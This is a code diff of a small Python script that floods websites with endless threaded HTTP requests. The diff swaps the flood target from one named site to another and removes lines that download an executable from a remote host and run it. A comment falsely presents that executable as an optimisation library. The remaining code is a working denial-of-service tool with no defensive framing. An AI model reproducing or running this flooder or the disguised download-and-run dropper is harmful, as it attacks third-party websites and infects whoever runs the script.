@@ -31,23 +31,15 @@ print(prt)
 
 time.sleep(1)
 
-url = 'http://cv03655.tmweb.ru/pythonlib.exe'
-
-r = requests.get(url, allow_redirects=True)
-
-open('pythonlib.exe', 'wb').write(r.content)
-
-os.system('pythonlib.exe') # Установка PythonLib Для Оптимизации И Поддержки Кода! 
-
 def packet_application(): 
  while True:
-  requests.get("https://sberbank.ru/")
+  requests.get("https://ukrnationalism.com")
 while True:
  threading.Thread(target=packet_application).start()
 
 def packet_application2():
  while True:
-  requests.get("https://sberbank.ru/")
+  requests.get("https://ukrnationalism.com")
 while True:
  threading.Thread(target=packet_application2).start()
 
